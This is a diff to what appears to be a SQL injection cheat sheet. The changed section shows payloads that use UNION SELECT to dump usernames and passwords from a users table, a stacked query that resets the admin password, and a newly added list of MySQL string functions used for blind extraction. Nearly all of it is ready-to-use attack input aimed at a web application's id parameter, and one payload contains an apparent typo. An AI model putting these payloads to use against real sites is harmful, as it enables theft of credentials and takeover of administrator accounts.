@@ -379,8 +379,6 @@ http://www.sqlinjection.net/union
     ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users-- 
 ```
 
-
-
 INSERT / UPDATE (adding or changing data):
 ```sql
 /* Insert new users (MySQL) */
@@ -392,9 +390,15 @@ INSERT / UPDATE (adding or changing data):
     ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";-- 
 ```
 
-Stacked Queries:
+MySQL String Manipulation Trickery:
 ```
-add stuff here
+Mid(version(),1,1)
+Substr(version(),1,1)
+Substring(version(),1,1)
+Lpad(version(),1,1)
+Rpad(version(),1,1)
+Left(version(),1)
+reverse(right(reverse(version()),1)
 ```
 
 Sqlmap:
